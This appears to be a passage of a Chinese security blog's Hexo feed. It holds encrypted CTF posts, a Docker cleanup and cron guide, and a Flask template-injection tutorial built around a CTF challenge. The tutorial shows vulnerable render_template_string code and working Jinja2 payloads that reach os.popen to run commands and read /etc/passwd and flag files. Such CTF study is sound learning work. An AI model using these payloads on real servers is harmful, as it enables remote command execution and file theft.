5388426b7620b03ae313e26c0b77391c3c91befc832df5dc832c2f13a50ba074510619969a5183b1b3108d1aee1cacbf6a1e2a9ff05341e2d3c0d7620fac77455f278735a60aa8bada03da4507194587947a65279487ef7d2445254f2b343209a0f351819ee0f166e02815007f83625a1e20c72291e1dfd4f7ec1a69d45b9afc9d6118a15cbe9ae1a8d5f17b3428d7b7eadc7514801f430a231b817a8e196e8f19681c5c102d13f95e968b2c59be97ab432615e515f1755ebaeffb5dd39563f8423e959a49abbfe75c45ff58dd13bb844527e4fa18e4b8fe2ab1f6d6f69ebf940f3a4e3e923e27175afd62a4906d69dec5d027270b35472025f9be03202863193767f524a98922b8056cb79bbed8096dfe6f751562042b9d22eb3a734db85b79c4eb2661d4b6570042dfee04ed4570a7cbd212c5680205c9966adad94ddaa55270ee4805135d77c2499321bb7a87edf580b83361e6c609e3226f61ff7b3c633404b65fec2236212045d055a74fe95853b1f622e898064ddccdc5d0b8615a4a05f2a2bf611a4eda000de87383c7d7d330b1c75ab6853b91f7d1840139bb5979190c0d6fc8704c22274ae667bc8520a067a5b52f21193c95bd9d0ee0230865ccf8f5c08040e83c443717157f556cd1b3d71bad81f04c528db7ac08135869e8563b84a567ec29524ffa1d0a030b792d235febe56ef66532f0c534df97a654e7a97f55148b9e2d8b841f791d273e3ffc57d2902d2ffc82a62494a5048ca494c2bd66cb3675cbaa83ce565837a85b8bbf05d89b82215e2ee4141ee453d244ccfcf5b0ad020e53e7ee27b0975a11ac6fac7d72997ba0d3048db158f76c563f5429551a87e146291fdb6938a9dcc0db264b0ec322fa1e7113c477b475f25d79e63f52384e9d2fda1e26d57588c800f4751d338fc36bc67e27c6c358d9f4c83cebebf71778d7d95ffa3536a19e87a3093a007906f6a4582ba8f145bb7703359f58ca37fc00b8750bc033729fb748c82423e2a110ab1f0172095d3186952fae8309a8e942c6a4827b95e23f8674079e8fd2d203e73c6ab20f23162b6df8a1ed45c211c90d1e6e08aa8c3b646bbc43fc64a35b5981d7938bbe95ce641f0154f561f2b12edb74fe6fb7b7fda8ed138c5ddf87508bd5c28afd675461ca960641e9bd454b98ca51b2e841fa0b0841a24193704528fd54686b2687e19945e46f5ea141a117d215fc970307edc49801dfa4dd7ae587e4f9ceb81d7e20546314017603641df501b73ec05217095847a52f41994b079f8721006c4d24f1808eb59873b184278bb2180ab48f389451415a2a819bed0742b48c54cfe81c17bfe984eeba3fa224f90079deb87d8ae5c05b184aea14eed6a44ccad93c842b0d28a5d1aa433ea410e8c908142d44ff486d9db4f396f33a72bdc7efbcce42d8aa53574e9dc685404de58aef6fe653f34ede60922f8d82ff4637254b38bcdb154c3ce3015607a1c69fdd51808bb86e0694f656e970b43d71e4a4a0f023f2fa042a94207d2207f581ba1da0d05082763991b78dc7c99bb6bd7a0a6a5e99be0165983549aab23f8a2a85a9ce9e060aea0e47d25a784525f32ecdc91ba43df9f3b8dd2245f82d1fbcf83b1f9c8deafd5195f4e0a5bbfbe1cd81a06eea35574206cd60368c3ee33029b97fe6d26b04a997d4e4c1720188732c122ffff266ee989e32dc7606d65695dea15a20ed0276133e7248e3d9207c6a9548662deaf4f5090c01328c3e85aa62a0af2bdd883056a7055a49eb4a12bbfa34fed5bc8c15aa254a917e12ea23901dda8caad4eadf95cd9ed64cf37b07153f72e956b2d130a891f0a7f669cd6c40a08200e04c13b6105eed9eec7f456decd636ee15a177a8c37e26d8b4de202cc253205589a3c235da6ad921ead490d4f7632b776a379490fa3eaa99acac2a1990110492f8facef5cb704e828e694f396022ed3e5da45ebac374c055d542f86a7cb1802b0ddcfb7783c66c709b94a062e9e41929ee540ed326fcc898d0c685c477b241091dd9e01c5b4c5ba6286e0c8309e6f7e3045ea2c09b9d4bd348c991d22cf558d14d02d36224b316ff8e224815edcce82ed0aadb33bdbe8ac13eded3effe36a34b556fd834565157951201669aad139e8e4bc3be1a33aee74a3810b293c54d64ee49a375368f32b30ec52eda4a69706a7ad714d872c4a693212a64164bb7a12322c46ccb67be31f013ce06525d312c9498c6ef58e00327448375174f1d7413703ac42bf53c17683bfd6987c2eb7c94ed72312f52e52a5f5a1797be1c7b5d1ff259670355f9eb3be8fc51c6b1c799f084c5415302ef8df7fafc8791496693d4f1bc516a791e2a3bec6061ad2f56ac388e883972eced5ed213fe0c7f47c36ce0fe6848335003ec6486017eddbb96f0ded59f748428fe87bdd965fa468a002337ec2e0426d57958113fabe9f75601ef8892ec776741350a04d0f2500073eaf30b494adee53f27987521877e8f6500ebcf2b644efa3876c110960e639b01b428dcf3bbf112cdb67adb1cf66e8f2df98766c7c68e2b9ca9e61ff8c20acbbdd5a4dcf0f69b57ad5bdd50f59d5944b2cd0e2ac79375348c578b8a606e192dbfe6a7f3ca7060a97fc4178f7fa0cfbd6bea900dd7da5e707922a6a36d668149562c97bade2aea2996fb291416559a287da94448fef048b7a62d6997fe9de9e6112a1faaefd12ee5513eb946fba73b811dafc58a3198435c3305187f45c55227815f1d2243e6cf8ebbea2f3e9dda37cbee40d879d4a373f0b9c6a9fca25c2395e41a93e72ee77675c8ab9b5c77a4b941f72dbd7a446badcd9918898f4a7e41b300285939c4cd615717c14ce9edf5f06c9313f83a41cae8fe3cfe5827faabfb1b386e91c5a9e9f62b966f1d4126c6c1f6ebc07985b3e78fcf81cd0fefbceae433aaa4e46ffd2062cb4f957448d7a5436bd6371bcb14aed465b802a51a3b75af7cd724ca0a74aa8b86bc0faf13e9234f158d3bfdc108763a4efd763d34e05e3c505e93d200521daa869ff12a22008e8cd3e74dac9f230ef4bdb48722e6143dfabfeb2c66f7f6823bf612a272c0d6ba9b68cedbec443b558125b74a64b81aafde5073d50cdeee233c32e02fa1f9f277ce1dd6713a75bbcd9807dac1600697c9d09d67eedb1e3d510bfa77380735a116a2033dacc9d065d4a2d66d8799439da79f7ed92e5ee110129bc93bb2e3e040430dcb8b2db9ef0452c677b2eaca4f1ef9b7f1363ce26cf15248ef920adddc8906a7ec68ed98481d331563110bf8fb2569e939b57840891fab6a6a32f73dbfb7aab52843259e0aad12b8380ed5f1dc9b314c3b795233f8cbcfbf922dacb937511664ee2dda8ebf44b14e6bbb41d1aca58d5804051242af76710306d98dae5ed1d0dd924eb006a0090dbe202a79ff8c3ae0ecbab0ae66ec19cd6b053ac9c0f44983d0db0fe77db18e28c49cd9fea58491054767e560c8b28fdf262a8d47894406156793add240559a3c1e569ed18028ddd665b4511ca0fdbe2f83dbf221270d03250ad7136e4fbc2b67095101247d7718daf0e70a462f8618f47ee86e470513d0ef1d9b120eda82cf5491b1f51be2d97061bc35eb37c70ce27b466e322da2c0c14a026eb4e56083084219aa042bad7f1b611ec25f3a66e3937161425cd2c8aaecd14061e73c1e4ea882ac0ecd73828e00f7a9151a59fe1b79848634f0fb88c1d5f4239fab0a50a46a5862a8746e28d954240fb3035a3a4da73996ce43c207acad0322431a2734d2e3ad03bb7de78e505b656f65cfe6b1dd1bc734707087a270854f7a145db64dd508b30705434b29f2174159885b91ccdb5e5a06f6320f8d2f3753d8c48f12925343681be83f1b21912d25b13b52591978f0f0057d9c5db5001c41aabe74d2b5b8cefb6ef4494c83a20884443130a12a75ddb7892a57015d900500741ef5cf3d3be6b8a332ffc203be3ebdd52ba2b2d7f0fb256b67c402d55cc6205518bd2fff9bb6145a4de1629f23be6ca770bb4c46b730e7056e81c091df11936fe0dab13f28c72f26316a7bfc89f9d98718795cd9d4b0f87f8e70c0e941d156467baaf5dd46158221253468d61f38e10579ebc8f08653f1c24afae6015f9f07e7aa1ee2639bb06db938489bd8ca881e611fb262ff88a3bae5dd13eb13cfde1cdf22e823e307d8e3d81749808d53d55b5e8fb4c07f0cb9a01b9a0b299c0fbed49d6fa84db18b80ee658497d833863d70c1e146e449cae64b761a14c181fb3f53c17c29ae0829412d747ee6c8109463d70f830316b771cf0250e9d6b22afe9e7bbf97c5e4522148e694d1e00e6faf258f5bd6c6804e31eecf3cf1d43c3726471c0fa8b192220d4033b6aff91fd9aab5cf821fd6fd7db34e82c6a4a2335dc7efa36ee2806a33d745e42dfc46ef6d7219d3715dbc50a0b76385b46971f96c2bb6cff1503f28695538b2cb1331e6f4f7b1a6f5949791d48044f7d6d6dba12fc144999fce2f0a3931500e8006ed3e8670869aec49a236579c5023022065270122fef06409280051c167abe7cd53948e4166820e40636fcec7b1f3117d38468a3ecd2dd6b81f291af958bb75cb32d0fe365cf64579339872881109173722e1f0d8fd05da7680967222f941803f909fa589e0b301a72db3d2624601d7b554e51a12715d01012c2d5e345dc0818ac009d6266434f34d35621db7074b6ca3c813095b1d16911acdf4ef3a34fc2f1c0dc87a625bab8737b9c1113a3797a9ee3357591370a715054194822071d1108b5e292f17994793bd471dcbc3e6b0f2d4dec83b8bb7279fec1d8799a27b6f196910a2a6a1a0d09e38fb63987ee2855f4fdf153da3b6c5ba714e52fe3cfef1c1f1a1182109b3eed62508ecce60ff99841843e6e0984970992f3c3a023d9e4667acb94170f73cbe02f4cddecbfd3f8152ea60568284d52ae1343f410936badff7e55e901be4d3c3c8f7d6def48cb0a2577f14b51c170fc7fe1fe58e32dcfa0281006c60451969ca2e7143e50b9ad4ed81e0bae785ca1b7ba778ee3a05db37edf71373d342b87a36bd59f835f3e8254bbea045bc320ebadca8d44463e32eb47b50163bb1928bf7a1991f62bd3004f71669825e2f7258cf867827ade4eaa383d8b82f25b623e299d839a9fbf0e2279bc39d78be4c7a5be2cbd528c847cf209f3e0aa4f1d03ebff5d42737703f0f60b42babf5c103894b0662c9140042fc17b782c6988cc20fda8210a26d75b516a1830776edea186b877b58c35a6f99d89dfb1cdd0bbe453a5c59986cf683724b1b1708b12dabb9acb81b2b0f8a219cb53c91c022a0aab711f25c9b448eb931dd668a1e6bff7871ad555326f968d9a99c1e17c6e943d145360a7e0d714864409a74a6f21b276d2c96badc404226e8881f4afa4f36bdb3bf0a27e6998332e066d113a83db33da720b8f5ba79c6622e98f17ab00525e0c73451dbf62ca5b23c26f384610497e1c18477033c4d0aba780d1162bcce4455ba417533b2468ef670ff3d28e6549d318ce374367b2a1e68d84a48758776e503dcc4118bbd349d6e595fdc038e580305961d09d4569f258f3f28b11751d1e5ef45095d5c483e60d384867c2dff8d93c2b0f7da1ef66606428f92aa1b287d648ec3978d7f61ccf8abeaea3ec060481feaaac88a172367ac78c57a0b4181a19a56c17f14b884017a9e34907797f6377df999c13446a388e2f23c18d37d7455660f842307dea3b847a9b6344e3a8c69c24723430aabb6d76e0931b4959db4004a949f90ee5bd72057c3e334bea33a35cd89a0a8f2340613d6cef6f16e988cf9111514e97b0eeff0f60bf0be2584aac57c81bc3e33d8e3b16100e29819a91afcb62e67a29fb0856a717b101c70515770c7c7cc08c7e11591fe07cebeea07fdfd51a931b960eb94dfd4adce399035cc5d5d10397c6090db34fd3cf7f77b3d1656a0ec5e2f75d00550f303f0d7c5988e9a0a9fd4b3a392f83a080c3077ccd8cb713360a8c4d3420c072a4efa110c680660e1266e36be14b8d4bb4e4e8ac951ee1461fca006c3a622f9f57af6be14e5edd40f968cf68f44c065b04b9ede62a781915b060179c6e56f51263ae1c03fde816398eb65867e7766acc94c462da77bfe0028e902af91e87f076b8642e409ef15f629efb0e93c4e5c1d7a91490493d5fc75da190d859772037db8b7d9c4f813ba7fc86fcf5479e06b1d6432888f9152d785a3f04940e004d4c1d9534af74397fa2bd6268b3849c549b5a78d443688f66c7056044b3a1c0314031421cd22ca56b3fc556dab2d3a0d673143b54aead972e54ec5ff37549525496cc792c948f47d5f6243c700d0675b82f64b64e3070ebd4c78e8ee586f5d1cd7059ebb7267266f6ebed68289b19a074827d3c3c2315aa39cf1563dc8a3b71125f8af19c242e554c227cc4d2ba467218fa49903f79e336a9fd1fa3fa921b87fe98aca916424785c2f62e29b52adbc1d217c7aae45655c3e59e310203667daf6db40bd7a3f1f8e463260a453d51c868d54f605b0ccefbff755f328636bec0581d7a349c374f297e2f85a8aacb332c3a73d7d22fdf233cba992b3d1921fe1b7f3c9480cbbd0eab81aae51ef4f80ff8c0adba197e23ddb50aca3c22892499afe9d5ca2a017f9a90469ab4d38227dad3a27fe83fe413aa01b02604cf4879d82f002e4529a4e388b1214d6efb50838a763c4631cae496fd70201239daad3cf5ca1e82f5fbb35cc7d3d3b5b702aa5fc1cabd5fedd6fdd14a176e17c5ab0c05887fd5983b9c2adb113103bcafcc87d8e9ef5a21ff00546b5d38a334ab1267e78464b4222e05bc6a0b779fa8a870335ff6c2c8ce4a889821b9d055f6df49db5edbf1e4d12d1935cd254a0e97bb9a144a93bf6434840b4c15508636237af995a6e7e4fb0afec4ddf0873c2d523fae5b1157bab1d9b790c224e558e724fd748351301d5d8bd4d2f462c832a4fc4031c64964e0bdc471b6e767870aa2965e905b895bda8ba5ae999a487d3497fd6bf256e13e526fac5d15d353fcb9dec0ae1cfe4bd40af8e3f8e7413691197bcc59d4083d3f0948301c5b70ebf46005551de8a44d1aab2c56088dbc3247d2343d9f8ef2bed8318343c890019cfcdd2c3273b0855690859d7be857866c836ccf76206feb5c3dcd16c265a9f19f5c8d28994baf484ef98978751b2dad5a499f3f91d098559694d96bc899f33fae824a498336d1a1f0bcd60d1375a08a8b2348c6ed2ed65449df18c97693c56562478e410</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Docker容器定时删除(重启)及容器镜像批量删除创建</title>
    <url>/2021/01/01/Docker%E5%AE%B9%E5%99%A8%E5%AE%9A%E6%97%B6%E5%88%A0%E9%99%A4-%E9%87%8D%E5%90%AF-%E5%8F%8A%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p>关于Docker容器的定时删除（重启）及容器镜像的批量删除和批量创建<a id="more"></a></p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">镜像创建：</span><br><span class="line">docker build -f <span class="symbol">Dockerfile</span> -t [随意命名] .</span><br><span class="line">容器创建:</span><br><span class="line">docker run -itd -p <span class="number">12345</span>:<span class="number">80</span> --nmae [随意命名] [镜像名]</span><br></pre></td></tr></table></figure>


<h1 id="直接删除所有镜像或容器"><a href="#直接删除所有镜像或容器" class="headerlink" title="直接删除所有镜像或容器"></a>直接删除所有镜像或容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接删除所有镜像</span></span><br><span class="line">docker rmi `docker images -q`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接删除所有容器</span></span><br><span class="line">docker rm `docker ps -aq`</span><br></pre></td></tr></table></figure>
<h1 id="按条件筛选之后删除"><a href="#按条件筛选之后删除" class="headerlink" title="按条件筛选之后删除"></a>按条件筛选之后删除</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按条件筛选之后删除镜像</span></span><br><span class="line">docker rmi `docker images | grep xxxxx | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按条件筛选之后删除容器</span></span><br><span class="line">docker rm `docker ps -a | grep xxxxx | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br></pre></td></tr></table></figure>


<h1 id="Docker容器的定时删除重建（重启）"><a href="#Docker容器的定时删除重建（重启）" class="headerlink" title="Docker容器的定时删除重建（重启）"></a>Docker容器的定时删除重建（重启）</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python脚本实现</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;docker rm -f sqli-labs&#x27;</span>)   //删除容器</span><br><span class="line">os.system(<span class="string">&#x27;docker run -itd -p 12345:80 --name sqli-labs [镜像id]&#x27;</span>)  //新建容器</span><br></pre></td></tr></table></figure>
<p>然后利用crontab设定时任务，定时执行py脚本</p>
<p><strong>ubuntu安装cron</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">安装：apt-<span class="built_in">get</span> install cron</span><br><span class="line">启动：service cron <span class="built_in">start</span></span><br><span class="line">重启：service cron restart</span><br><span class="line">停止：service cron <span class="built_in">stop</span></span><br><span class="line">检查状态：service cron status</span><br><span class="line">查询cron可用的命令：service cron</span><br><span class="line">检查Cronta工具是否安装：crontab -l</span><br></pre></td></tr></table></figure>
<p>第一次进入的时候要选择编辑器，选择后你可以配置新cron作业了，一般是选3</p>
<blockquote>
<p>crontab -e   //vim编辑器</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210404154527.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>图中命令的意思是每天23:59 执行/root/dingshi.py脚本（脚本内容就是上文的python内容）</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">//crontab 时间设置</span><br><span class="line"></span><br><span class="line"><span class="symbol">*</span>    <span class="symbol">*</span>    <span class="symbol">*</span>    <span class="symbol">*</span>    <span class="symbol">*</span></span><br><span class="line">-    -    -    -    -</span><br><span class="line">|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|</span><br><span class="line">|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    +----- 星期中星期几 (0 - 6) (星期天 为0)</span></span><br><span class="line">|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    +---------- 月份 (1 - 12) </span></span><br><span class="line">|<span class="string">    </span>|<span class="string">    +--------------- 一个月中的第几天 (1 - 31)</span></span><br><span class="line">|<span class="string">    +-------------------- 小时 (0 - 23)</span></span><br><span class="line"><span class="string">+------------------------- 分钟 (0 - 59)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>DC-4 LINUX sudo提权</title>
    <url>/2021/08/19/DC-4-LINUX-sudo%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4173ef663ca2c0f525a74112ea4f6a9d91fcd84d594499ab33fd90fa03a26094"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Flask模板注入</title>
    <url>/2020/04/23/Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>在攻防世界做到一道涉及模板注入的题<a href=" https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=1" target="_blank">Web_python_template_injection</a>，简单了解了一下模板注入<a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><code>模板</code>可以理解为是一段固定好格式，并等着你来填充信息的文件，<code>模板注入</code>就是指将一串指令代替变量传入模板中让它执行</p>
<p>先了解了一下装饰器的概念</p>
<p><strong>装饰器</strong>:  简单讲就是在一个函数内部定义另外一个函数,然后返回一个新的函数,即动态的给一个对象添加额外的职责。比如有一个函数func(a, b)，它的功能是求a,b的差值，我们现在想对函数功能再装饰下，求完差值后再取绝对值，但是不能在func函数内部实现，这时候就需要装饰器函数了，比如func= decorate(func)函数，将func函数作为参数传递给decorate函数，由decorate来丰富func函数，丰富完成后再返回给func,此时func的功能就丰富了。</p>
<p><code>@</code> 用做函数的修饰符，可以在模块或者类的定义层内对函数进行修饰</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">(a, b)</span></span><span class="symbol">:</span></span><br><span class="line">        ret = func(a, b)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> abs(ret)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"> @decorate</span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(a, b)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> a-b</span><br><span class="line">    </span><br><span class="line"> print sun(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"> =&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>


<p><strong>@app.route</strong></p>
<p>app.route装饰器作用是把函数和URL绑定</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flask </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello word&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>访问<code>http://url/index</code>的时候，flask会返回<code>Hello World</code></p>
</blockquote>
<p><strong>渲染</strong></p>
<ul>
<li>render_template      用来渲染一个指定的文件的</li>
<li>render_template_string      用来渲染一个字符串</li>
</ul>
<p><strong>模板</strong></p>
<p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式

模板引擎会对输入变量进行编码转义：

错误使用：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line"> <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>
上面这段代码直接将用户输入作为了模板，不会经过转义和过滤的步骤，我们在传入`code`时，可以用`&#123;&#123;&#125;&#125;</code>来包裹代码，以替代本应时参数的<code>id</code></p>
<blockquote>
<p><a href="http://url/?id=">http://url/?id=</a></p>
</blockquote>
<p>正确使用：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">&#x27;/test/&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</span><br></pre></td></tr></table></figure>


<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块</p>
<blockquote>
<p>os.system  退出状态码<br>os.popen    以file形式返回输出内容</p>
</blockquote>
<p><strong>对象的魔术方法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__class__</span>  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line"><span class="comment">// __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>


<p><strong>步骤</strong></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">#测试是否存在模板注入</span><br><span class="line">&gt;&gt;&gt;&#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;</span><br><span class="line">[构造简单的payload，看服务器是否有回显]</span><br><span class="line"></span><br><span class="line">#获取<span class="string">&#x27;&#x27;</span>字符串的所属对象</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">#获取str类的父类</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"></span><br><span class="line">#获取object类的所有子类</span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;...</span><br><span class="line"></span><br><span class="line"> #找到所需的类在列表第几位（从第<span class="number">0</span>位开始）</span><br><span class="line"> &gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;命令行语句&#x27;</span>).read()</span><br><span class="line"> [ popen(<span class="string">&#x27;ls&#x27;</span>).read(),意思是得到ls的结果并读取给变量，因此它会把当前目录所有文件都打印在我们的网页上]</span><br><span class="line"></span><br><span class="line">注：for i <span class="keyword">in</span> enumerate(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()): print i </span><br><span class="line">可用来列举类</span><br><span class="line"></span><br><span class="line"> #读取文件内容</span><br><span class="line"> &gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">常用payload:</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">2</span>].<span class="variable">__subclasses__</span>()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">2</span>].<span class="variable">__subclasses__</span>()[<span class="number">71</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span>[<span class="number">1</span>].<span class="variable">__subclasses__</span>()[<span class="number">71</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat fl4g&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>包含os模块的类：</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
